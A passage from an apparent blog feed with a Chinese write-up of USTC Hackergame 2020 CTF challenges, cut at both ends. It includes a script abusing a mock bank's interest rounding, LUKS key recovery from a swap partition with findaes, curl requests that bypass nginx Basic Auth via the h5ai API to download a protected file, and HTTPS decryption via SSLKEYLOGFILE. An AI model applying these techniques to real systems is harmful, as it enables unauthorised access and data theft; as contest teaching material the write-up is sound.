class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code 